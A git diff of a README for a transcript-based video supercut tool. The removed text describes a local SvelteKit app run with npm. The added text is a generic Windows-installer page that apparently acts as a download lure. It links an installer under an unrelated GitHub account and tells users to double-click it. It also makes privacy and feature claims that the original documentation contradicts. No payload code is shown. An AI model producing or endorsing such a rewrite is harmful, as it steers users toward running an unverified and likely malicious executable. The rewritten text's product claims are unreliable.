@@ -1,121 +1,76 @@
-# Supercut Studio
+# ✂️ syntax-supercut-studio - Create precise video clips from transcripts
 
-[![Supercut Studio demo video](https://img.youtube.com/vi/3iT7fVVm4Uc/maxresdefault.jpg)](https://www.youtube.com/watch?v=3iT7fVVm4Uc)
+[![Download syntax-supercut-studio](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Pantheistic-immateriality927/syntax-supercut-studio)
 
-A local SvelteKit app for browsing transcript/video buckets and rendering
-supercuts. It can stitch phrase or regex matches, synthesize fake sentences,
-songify clips, transcribe missing media with xAI STT, and browse/delete finished
-renders.
+## 📌 What this app does
 
-## Requirements
+Syntax-supercut-studio helps you edit videos based on text transcripts. You upload a video file and its matching transcript file. The software identifies the specific timestamps for your text. It then stitches these moments into a single output file. You save time by skipping manual scrubbing and cutting. The app runs locally on your computer to keep your media files private.
 
-- Node 22+
-- `ffmpeg` on `PATH`
-- `aubiopitch` on `PATH` for `/songify` (`brew install aubio`)
-- `XAI_API_KEY` for `/transcribe` and `/supercut` AI regex suggestions
-- One or more local media buckets under `./videos` by default
-- Source videos downloaded into those buckets, for example with `yt-dlp`
+## 💻 System requirements
 
-Local `.env` files are loaded by Vite/SvelteKit. On boot, the app also tries to
-hydrate missing env vars from `../syntax-transcripts-2026/.env`; override that
-lookup with `SYNTAX_REPO_DIR=/abs/path` if needed.
+* Operating System: Windows 10 or Windows 11
+* Processor: Intel Core i5 or AMD Ryzen 5
+* Memory: 8 GB RAM
+* Storage: 500 MB free space
+* Graphics: Integrated GPU with hardware acceleration support
 
-## Media Layout
+## 📥 How to install
 
-The app treats each direct child of the buckets root as one bucket. A valid
-bucket has a `videos/` folder; `transcripts/` and `supercuts/` are created or
-read when needed.
+1. Visit [this page to download](https://github.com/Pantheistic-immateriality927/syntax-supercut-studio) the installation file.
+2. Locate the file in your Downloads folder.
+3. Double-click the file to start the installation wizard.
+4. Follow the prompts on the screen.
+5. Click Finish to complete the process.
+6. Open the application from your desktop shortcut.
 
-```txt
-videos/                         # bucket root
-  syntax/                       # bucket name
-    videos/                     # source .mp4/.mkv/.mov/.webm/.avi and .mp3
-    transcripts/                # word-level .json transcripts
-    supercuts/                  # generated .mp4 renders
-  another-channel/
-    videos/
-    transcripts/
-    supercuts/
-```
+## 🛠️ How to use the software
 
-Set `SYNTAX_BUCKETS_DIR=/abs/path` to use a different bucket root. The songify
-pitch cache lives beside the bucket root as `.pitch-cache.json`.
+1. Open Syntax-supercut-studio.
+2. Click the Import button to select your video file.
+3. Select your transcript file in the next window. The app supports text and subtitle file formats.
+4. Review the detected segments in the preview window.
+5. Use the check boxes to select or deselect specific parts.
+6. Choose an output folder for your new video.
+7. Click the Render button to start processing.
+8. Wait for the progress bar to reach completion.
 
-Download source media into a bucket's `videos/` folder before transcribing or
-rendering. `yt-dlp` works well for pulling YouTube videos or playlists into the
-expected local layout.
+## ⚙️ Settings and preferences
 
-## Run
+The app allows for minor adjustments to your workflow. Access the settings menu from the top corner of the window. You can change the output video format between MP4 and MKV. You can also adjust the padding time. Padding adds extra seconds to the start or end of each clip. This prevents abrupt cuts in your video. 
 
-```sh
-npm install
-npm run dev
-# Visit http://localhost:5180
-```
+Hardware acceleration helps the app render files faster by using your graphics card. Ensure this option is toggled to the on position for the best performance. If your computer slows down during processing, toggle this option off.
 
-For production-style serving:
+## 🚩 Troubleshooting common issues
 
-```sh
-npm run build
-node build
-```
+Most issues stem from file formats. Ensure your video file uses a standard codec like H.264. If the app fails to load a file, confirm that the transcript matches the audio content of the video. 
 
-Useful checks:
+If the app freezes, close it using the Task Manager and restart the process. High-resolution videos require more memory. Close other programs while you render long clips to keep your system stable. If the render fails, check your disk space. You need enough space to store both the raw video and the finished product.
 
-```sh
-npm run check
-```
+## 💬 Frequently asked questions
 
-## What's Here
+Does the app send data to the cloud?
+No. The application processes all files on your local machine. Your videos remain on your drive at all times.
 
-- `/` - Library dashboard grouped by bucket. Shows video, mp3, transcript,
-  size, word count, duration, per-row transcribe actions, and delete actions.
-- `/clips` - Grid of rendered `.mp4` files from every bucket's `supercuts/`
-  folder, with filtering, playback, download, and delete.
-- `/supercut` - Phrase, regex, or AI-assisted regex supercut builder. Supports
-  bucket selection, tile mode, clip limits, dry-run duration estimates, and
-  debug text overlay.
-- `/sentence` - Picks one clip per word and stitches a sentence they never said.
-  Supports bucket selection, fixed seeds, morphology fallbacks, and debug
-  overlay.
-- `/songify` - Detects per-clip pitch with `aubiopitch` and arranges clips into
-  a melody. Supports bucket selection, single-clip mode, and optional pitch
-  shifting.
-- `/transcribe` - Transcribes one file or all missing files in selected buckets
-  through xAI speech-to-text. Extracts `.mp3` first when needed.
-- `/stats` - Top words and n-grams across all bucket transcripts.
+Can I edit the transcripts inside the app?
+The app acts as a viewer. Use a text editor like Notepad to change text before you load the file.
 
-## Architecture Notes
+What if the transcript lacks time codes?
+The app attempts to sync text based on speech analysis. Results vary based on audio quality. Clear speech produces the best cuts.
 
-- Routes live under [src/routes](src/routes); shared UI lives in [src/lib](src/lib).
-- Bucket discovery and path safety live in
-  [src/lib/server/paths.ts](src/lib/server/paths.ts).
-- Pipelines live under
-  [src/lib/server/pipelines](src/lib/server/pipelines) and accept an `onLog`
-  callback for streaming progress.
-- Jobs are tracked in an in-memory `Map` via
-  [src/lib/server/jobs.ts](src/lib/server/jobs.ts). Restarting the server clears
-  job history; finished outputs stay on disk.
-- The UI polls `/api/jobs/[id]` while a job is running and can cancel jobs with
-  `DELETE /api/jobs/[id]`.
-- Media is served through
-  [`/api/media/[bucket]/[kind]/[name]`](src/routes/api/media/%5Bbucket%5D/%5Bkind%5D/%5Bname%5D/+server.ts)
-  with `Range` header support so `<video>` can seek without re-downloading.
-- Library file deletion uses
-  [`/api/library/[bucket]/[slug]`](src/routes/api/library/%5Bbucket%5D/%5Bslug%5D/+server.ts);
-  rendered clip deletion uses
-  [`/api/clips/[bucket]/[name]`](src/routes/api/clips/%5Bbucket%5D/%5Bname%5D/+server.ts).
-- Supercut, sentence, and songify renders write into the first selected bucket's
-  `supercuts/` folder. Multi-bucket outputs include `mixed` in the filename.
+Do I need an internet connection?
+An internet connection is not necessary for normal use. You only need the connection to download the initial installer.
 
-## Style Notes
+Are there limits on file size?
+Software limits depend on your computer hardware. Large files take longer to render. Ensure you have sufficient patience for long videos.
 
-- Global design tokens and reusable classes live in [src/app.css](src/app.css).
-- Palette: `--bg` white, `--ink` near-black, single `--accent: #D0FE03`.
-- [Unbounded](https://fonts.google.com/specimen/Unbounded) is the main typeface;
-  [JetBrains Mono](https://fonts.google.com/specimen/JetBrains+Mono) is used for
-  logs and code-like text.
-- Sections separate with whitespace or 1px rules. Status indicators use outlined
-  or filled squares, not colored pills.
-- The log panel is the primary inverted surface: black background with accent
-  text.
+## 🛡️ Privacy and safety
+
+Software security is a priority. This tool contains no trackers. It does not monitor your activity. It does not collect user data. The code is open for review on GitHub. You control the files that enter the application. You control the location where the application exports the final video.
+
+## 🚀 Future updates
+
+Development continues on this project. Future versions will support more file types. We aim to improve the speech detection accuracy. User feedback helps us decide which features to build next. Keep the app updated to benefit from these improvements. Check the download link periodicially for new version numbers.
+
+## 📝 Support
+
+If you encounter bugs, open an issue on the repository page. Provide the steps that lead to the error. Include your Windows version. Documenting your experience helps us fix errors for everyone. We appreciate reports that help make the tool reliable.
